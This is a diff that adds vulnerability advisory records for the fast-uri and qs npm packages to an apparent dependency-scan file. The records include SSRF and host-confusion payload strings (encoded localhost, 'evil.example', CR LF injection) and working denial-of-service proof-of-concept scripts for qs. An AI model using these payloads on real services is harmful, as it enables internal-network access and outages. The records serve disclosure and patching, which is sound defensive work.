+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/security/advisories/GHSA-f65p-4m7j-42xc"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-75975"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/3728465caacef4b16bc84b7d14760f1c8fe41595"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/607bfbe953f28a14c2e06ae64aff38c81ca2937f"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/9161eded1ff55fad9d9714c6ad6c0f0283547799"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://cna.openjsf.org/security-advisories.html"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/fastify/fast-uri"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v2.4.5"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v3.1.6"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v4.1.3"
+                }
+              ],
+              "related": [
+                "CGA-hw9p-v29w-g2vx"
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "fast-uri vulnerable to server-side request forgery via malformed IPv6 normalization"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-fph4-wmhf-6fwf/GHSA-fph4-wmhf-6fwf.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.4.1"
+                        },
+                        {
+                          "fixed": "2.4.5"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-fph4-wmhf-6fwf/GHSA-fph4-wmhf-6fwf.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.1.2"
+                        },
+                        {
+                          "fixed": "3.1.6"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-fph4-wmhf-6fwf/GHSA-fph4-wmhf-6fwf.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.1.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-75899"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-174",
+                  "CWE-918"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-02T15:42:39Z",
+                "nvd_published_at": "2026-08-24T10:16:39Z",
+                "severity": "HIGH"
+              },
+              "details": "### Impact\n\n`fast-uri` decodes a hostname's percent escapes twice in a single `normalize()` or `resolve()` call: once during parsing and again during authority recomposition. A nested percent-encoded host therefore survives the first decode and is turned into a live destination by the second, so `normalize('http://%256c%256f%2563%2561%256c%2568%256f%2573%2574/')` returns `http://localhost/`. Applications that normalize or resolve an untrusted URI before an SSRF check, redirect validation, or host allowlist can be steered to a different destination, including internal addresses such as loopback or a cloud metadata endpoint, than the encoded input appeared to contain. This is an incomplete-fix variant of CVE-2026-6322, whose encoded-authority-delimiter fix introduced the second decode.\n\n### Patches\n\nFixed in `fast-uri` 2.4.5, 3.1.6, and 4.1.3.\n\n### Workarounds\n\nReject untrusted URIs whose host component contains an encoded percent sign (`%25`) before passing them to `normalize()` or `resolve()`.",
+              "id": "GHSA-fph4-wmhf-6fwf",
+              "modified": "2026-09-03T16:25:59.437560740Z",
+              "published": "2026-09-02T15:42:39Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/security/advisories/GHSA-fph4-wmhf-6fwf"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-75899"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/2642290672e7211c990aaed3749c2ce667d0af4f"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/8c15dbe94ec50bb8e595791ebb42c35cef0fd304"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/ae92a4c5d8c4b6c9e447f048d5fcbde7eebd5514"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://cna.openjsf.org/security-advisories.html"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/fastify/fast-uri"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v2.4.5"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v3.1.6"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v4.1.3"
+                }
+              ],
+              "related": [
+                "CGA-4xq2-693h-hcc4"
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "fast-uri vulnerable to server-side request forgery via repeated hostname percent-decoding"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-jqff-g426-hqxp/GHSA-jqff-g426-hqxp.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.3.1"
+                        },
+                        {
+                          "fixed": "2.4.5"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-jqff-g426-hqxp/GHSA-jqff-g426-hqxp.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.1.6"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-jqff-g426-hqxp/GHSA-jqff-g426-hqxp.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "fast-uri",
+                    "purl": "pkg:npm/fast-uri"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.1.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-76172"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-177"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-02T15:41:53Z",
+                "nvd_published_at": "2026-08-24T11:16:40Z",
+                "severity": "HIGH"
+              },
+              "details": "### Impact\n\n`fast-uri` decodes percent-encoded characters in the scheme component with the legacy global `unescape()` and serializes the result back as raw characters, without re-escaping it or validating it as a scheme. A scheme that decodes to characters outside the RFC 3986 scheme grammar can therefore introduce structure the original input did not contain.\n\nFor example, `%2f%2fevil.example:/pwn` parses with no authority (`parse().host` is `undefined`), but `resolve()` and `normalize()` return `//evil.example:/pwn`, which reparses with host `evil.example`. The `%uXXXX` form (`%u002f%u002fevil.example:/pwn`) produces the same result, and a scheme containing `%0d%0a` reaches the output as a raw CR LF.\n\nApplications that normalize or resolve untrusted URLs before a redirect check, host allowlist, or outbound request decision, especially ones that treat a missing authority as same-origin, can be steered to an attacker-chosen authority, and a normalized URI placed in a response header can carry an injected CR LF.\n\n### Patches\n\nUpgrade to `fast-uri` \u003e= 4.1.3, or \u003e= 3.1.6 in the v3.x release line, or \u003e= 2.4.5 in the v2.x release line.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+              "id": "GHSA-jqff-g426-hqxp",
+              "modified": "2026-09-03T16:25:58.800307586Z",
+              "published": "2026-09-02T15:41:53Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/security/advisories/GHSA-jqff-g426-hqxp"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-76172"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/37f3417c82994279656854f83ce938acd81c3862"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/a941e626411f576f8d90883231e57b6c9d0ff98b"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/commit/c6a74bfd9d8c6b0df5362b3c7ae88d8021cb1e39"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://cna.openjsf.org/security-advisories.html"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/fastify/fast-uri"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v2.4.5"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v3.1.6"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/fastify/fast-uri/releases/tag/v4.1.3"
+                }
+              ],
+              "related": [
+                "CGA-j2q7-83c7-99jg"
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "fast-uri vulnerable to host confusion via percent-encoded scheme normalization"
+            }
+          ]
         },
         {
           "package": {
@@ -75161,7 +76338,190 @@
             "name": "qs",
             "version": "6.15.3",
             "ecosystem": "npm"
-          }
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-4mjr-xmp4-gh2g"
+              ],
+              "aliases": [
+                "CVE-2026-82417",
+                "GHSA-4mjr-xmp4-gh2g"
+              ],
+              "max_severity": "6.3"
+            },
+            {
+              "ids": [
+                "GHSA-x5fp-wj9c-mxmx"
+              ],
+              "aliases": [
+                "CVE-2026-82562",
+                "GHSA-x5fp-wj9c-mxmx"
+              ],
+              "max_severity": "6.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-4mjr-xmp4-gh2g/GHSA-4mjr-xmp4-gh2g.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "qs",
+                    "purl": "pkg:npm/qs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.2.5"
+                        },
+                        {
+                          "fixed": "6.16.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-82417"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-248",
+                  "CWE-703"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-02T14:45:13Z",
+                "nvd_published_at": "2026-08-30T00:16:34Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\n`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` → `stringify` round-trip — no `JSON.parse` — turns an unauthenticated query string into an uncaught throw.\n\nAn attacker-controlled `parse` input reaches the host application's availability asset — via `qs`'s own recommended `plainObjects` mitigation — and triggers an uncaught exception during a `parse` → `stringify` round-trip.\n\n### Details\n`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\n```js\nif (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n```\n\n`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    return !!(obj.constructor \u0026\u0026 obj.constructor.isBuffer \u0026\u0026 obj.constructor.isBuffer(obj));\n};\n```\n\n`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\n\n### Trust Boundary Note\n\n`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` — the standard round-trip in gateways and request-forwarders — then hits the unchecked call. \n\n\n### PoC\n`poc02c_isBuffer_qs_only_roundtrip.js` — pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nvar untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\nvar parsed = qs.parse(untrustedQueryString, { plainObjects: true });\nconsole.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\ntry {\n    qs.stringify(parsed);\n    console.log('[stringify] no throw (unexpected)');\n} catch (e) {\n    console.log('[stringify] DoS reproduced -\u003e', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02_isBuffer.js` — the minimal defect:\n\n```js\n'use strict';\nvar qs = require('qs');\ntry {\n    qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n} catch (e) {\n    console.log('[A] DoS reproduced -\u003e', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02b_isBuffer_async_crash.js` — worker death in an async sink:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nfunction handleRequestAsync(clientJsonBody) {\n    try {\n        setImmediate(function () {                 // async continuation, outside the try\n            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n        });\n        console.log('[handler] returned 200 synchronously; async work scheduled');\n    } catch (e) {\n        console.log('[handler] caught synchronously (will NOT happen):', e.message);\n    }\n}\nprocess.on('exit', function (code) {\n    console.log('[proc] process exiting with code:', code);\n});\nhandleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n```\n\n### Execution Steps\n\n```bash\ncd poc\nnpm install qs@6.15.3\nnode poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse-\u003estringify -\u003e TypeError\nnode poc02_isBuffer.js                      # minimal defect -\u003e TypeError inside stringify\nnode poc02b_isBuffer_async_crash.js         # async sink -\u003e uncaught throw -\u003e exit code 1\n```\n\n### Reproduction Evidence\n\n`poc02c_isBuffer_qs_only_roundtrip.js` :\n\n```\n[parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n[stringify] DoS reproduced -\u003e TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02_isBuffer.js`:\n\n```\n[A] DoS reproduced -\u003e TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02b_isBuffer_async_crash.js` :\n\n```\n[handler] returned 200 synchronously; async work scheduled\n[proc] process exiting with code: 1\nTypeError: obj.constructor.isBuffer is not a function\n    at Object.isBuffer (.../qs/lib/utils.js:332:78)\n    at stringify (.../qs/lib/stringify.js:127:45)\n=== EXIT CODE: 1 ===\n```\n\nThe pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\n### Impact\n\nAn unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\n### Recommended Fix\n\nReplace the duck-type with a brand check mirroring `utils.isRegExp`:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    if (typeof Buffer !== 'undefined' \u0026\u0026 typeof Buffer.isBuffer === 'function') {\n        return Buffer.isBuffer(obj);\n    }\n    return Object.prototype.toString.call(obj) === '[object Uint8Array]';\n};\n```\n\nIf duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.",
+              "id": "GHSA-4mjr-xmp4-gh2g",
+              "modified": "2026-09-03T16:25:59.169424867Z",
+              "published": "2026-09-02T14:45:13Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/security/advisories/GHSA-4mjr-xmp4-gh2g"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-82417"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/commit/e83d321ffafb38cf210683ac31714fce6ce1c6c6"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/ljharb/qs"
+                }
+              ],
+              "related": [
+                "CGA-cqff-7h6x-66mj"
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "qs: Denial of Service via Attacker Controlled isBuffer"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 6.15.3",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-x5fp-wj9c-mxmx/GHSA-x5fp-wj9c-mxmx.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "qs",
+                    "purl": "pkg:npm/qs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "6.14.2"
+                        },
+                        {
+                          "fixed": "6.16.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-82562"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-770"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-09-02T14:46:57Z",
+                "nvd_published_at": "2026-08-30T01:20:32Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\n`qs` `v6.15.3` allows bracket-key input to bypass `arrayLimit` and `throwOnLimitExceeded` when `comma: true`. The input `a[]=1,2,3,4` succeeds with `arrayLimit: 3`, while the equivalent plain-key input is rejected.\n\nAffected version tested:\n\n```text\nqs v6.15.3\ncommit 18d085e919dae70c8f1b200ab99323058edab2c2\n```\n\n### Details\n\n`parseArrayValue()` enforces the comma limit only for flat values. The `a[]` form is marked non-flat, so its comma-separated value is wrapped after parsing and the inner array is not checked. A single parameter can therefore materialize arbitrarily large arrays.\n\n### PoC\n\n```js\nconst qs = require('qs')\nconst options = { comma: true, arrayLimit: 3, throwOnLimitExceeded: true }\n\nconst result = qs.parse('a[]=1,2,3,4', options)\nconsole.log(result.a[0].length) // 4; expected RangeError\n\nconst big = qs.parse('a[]=' + '1,'.repeat(1000000) + '1', { comma: true, arrayLimit: 20 })\nconsole.log(big.a[0].length) // 1000001\n```\n\nOn `v6.15.3`, the first input parses successfully and the second creates an array with 1,000,001 elements. The equivalent `a=1,2,3,4` input throws `RangeError` as expected.\n\n### Impact\n\nAn attacker who can supply a query string or form body can bypass configured array limits and force excessive memory allocation, causing denial of service. The limit must be applied after comma splitting and before the resulting array is wrapped.",
+              "id": "GHSA-x5fp-wj9c-mxmx",
+              "modified": "2026-09-03T16:25:59.599538782Z",
+              "published": "2026-09-02T14:46:57Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/security/advisories/GHSA-x5fp-wj9c-mxmx"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-82562"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ljharb/qs/commit/8859c37470e11b42b547b275e4e9bd0bc8cc5464"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/ljharb/qs"
+                }
+              ],
+              "related": [
+                "CGA-763c-8493-c8p4",
+                "CVE-2026-82562"
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "qs array-limit bypass via bracket-key comma parsing"
+            }
+          ]
         },
         {
           "package": {
